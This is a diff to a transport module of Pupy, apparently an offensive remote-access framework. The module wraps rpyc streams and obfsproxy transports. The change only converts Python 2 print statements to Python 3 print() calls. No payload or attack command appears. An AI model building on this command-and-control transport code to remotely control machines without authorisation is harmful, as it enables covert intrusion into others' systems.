@@ -2,6 +2,7 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 """ abstraction layer over rpyc streams to handle different transports and integrate obfsproxy pluggable transports """
+from __future__ import print_function
 
 __all__=["PupyAsyncTCPStream", "PupyAsyncUDPStream"]
 
@@ -25,10 +26,10 @@ class addGetPeer(object):
 
 def monitor(st):
     while True:
-        print "upstream: %s %s"%(len(st.upstream),repr(st.upstream.peek()))
-        print "downstream: %s %s"%(len(st.downstream), repr(st.downstream.peek()))
-        print "buf_in: %s %s"%(len(st.buf_in), st.buf_in.peek())
-        print "buf_out: %s %s"%(len(st.buf_out), st.buf_out.peek())
+        print("upstream: %s %s"%(len(st.upstream),repr(st.upstream.peek())))
+        print("downstream: %s %s"%(len(st.downstream), repr(st.downstream.peek())))
+        print("buf_in: %s %s"%(len(st.buf_in), st.buf_in.peek()))
+        print("buf_out: %s %s"%(len(st.buf_out), st.buf_out.peek()))
         time.sleep(3)
 
 
@@ -69,7 +70,7 @@ class PupyAsyncStream(Stream):
 
     def close(self):
         """closes the stream, releasing any system resources associated with it"""
-        print "closing stream !"
+        print("closing stream !")
         self.active=False
         self.buf_in.cookie=None
         self.buf_out.cookie=None
@@ -143,8 +144,8 @@ class PupyAsyncStream(Stream):
                 try:
                     received_data=self.pull_data(data_to_send)
                 except IOError as e:
-                    print "IOError: %s"%e
-                    print "closing connection"
+                    print("IOError: %s"%e)
+                    print("closing connection")
                     self.close()
 
                 with self.downstream_lock:
